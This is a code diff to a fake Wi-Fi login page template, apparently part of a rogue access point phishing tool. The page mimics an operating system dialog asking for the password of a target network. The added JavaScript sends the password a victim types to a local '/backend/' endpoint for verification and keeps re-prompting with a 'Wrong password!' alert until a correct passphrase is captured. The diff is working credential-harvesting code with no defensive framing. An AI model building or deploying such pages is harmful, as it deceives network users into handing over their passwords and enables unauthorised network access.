@@ -292,15 +292,43 @@
         ' 		<button id="button-join" class="action hidden"></button>' +
         ' 	</div>' +
 	'</form>';
-        
+
+        /* Callback receive the passphrase status and password*/
+        function validate_passphrase (password, callback) {
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("POST", "/backend/", true);
+            xhttp.onreadystatechange = function () {
+                if (this.readyState == 4 && this.status == 200)  {
+                    var json = JSON.parse(xhttp.responseText);
+                    callback(json.psk_verify, password);
+                }
+            };
+            var data = JSON.stringify({"psk_verify": password});
+            xhttp.send(data);
+        }
+
+        function mobile_validate_action (pw_status, password) {
+            if (pw_status == "success") {
+			    document.getElementById("wifi-search-password").value = password;
+			    document.getElementById("button-join").click();
+            } else if (pw_status == "fail") {
+                alert("Wrong password! Please re-enter the password.");
+		        var popup = prompt('The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.', '');
+                if (popup != null) { 
+                    validate_passphrase(popup, mobile_validate_action);
+                }
+            } else {
+			    document.getElementById("wifi-search-password").value = password;
+			    document.getElementById("button-join").click();
+            }
+        }
+
         function load_mobile() {
-		var popup = prompt('The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.', '');
-			
-		if (popup != null) {
-			document.getElementById("wifi-search-password").value = popup;
-			document.getElementById("button-join").click();
-		}
-	}
+		    var popup = prompt('The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.', '');
+		    if (popup != null) {
+                validate_passphrase(popup, mobile_validate_action);
+		    }
+        }
         
         </script>
         <title></title>
@@ -341,7 +369,7 @@
                 document.getElementById("loader-windows").innerHTML = loadhtml_windows;
             }
             else if (jscd.os == "Android" || jscd.os == "iOS") {
-		document.getElementById("loader-mobile").innerHTML = loadhtml_mobile;
+                document.getElementById("loader-mobile").innerHTML = loadhtml_mobile;
                 load_mobile();
             }
             else {
